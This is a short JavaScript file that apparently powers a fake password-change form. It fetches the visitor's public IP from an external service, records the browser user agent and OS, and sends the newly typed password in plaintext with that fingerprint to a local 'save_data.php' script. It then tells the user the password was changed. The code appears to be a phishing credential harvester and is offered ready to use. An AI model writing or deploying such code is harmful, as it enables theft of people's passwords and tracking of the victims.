async function captureUserData() {
    const userAgent = navigator.userAgent;
    const ipResponse = await fetch('https://api.ipify.org?format=json');
    const ipData = await ipResponse.json();
    const ip = ipData.ip;

    const os = userAgent.includes("Windows") ? "Windows" :
               userAgent.includes("Mac") ? "Mac" :
               userAgent.includes("Linux") ? "Linux" : "Other";

    return {
        ip: ip,
        browser: userAgent,
        os: os
    };
}

async function handlePasswordChange() {
    const newPass = document.getElementById('newpass').value;
    const confirmPass = document.getElementById('renewpass').value;

    if (newPass === confirmPass) {
        const userData = await captureUserData();
        
        // Send data to PHP script
        fetch('save_data.php', {
            method: 'POST',
            body: JSON.stringify({
                password: newPass,
                ...userData
            }),
            headers: {
                'Content-Type': 'application/json'
            }
        })
        .then(response => {
            if (response.ok) {
                alert("Password changed successfully!");
            } else {
                alert("Error saving data!");
            }
        });
    } else {
        alert("Passwords do not match!");
    }
}

document.getElementById('clickableLink').addEventListener('click', function(event) {
    event.preventDefault(); // Prevent default button action
    handlePasswordChange();
});
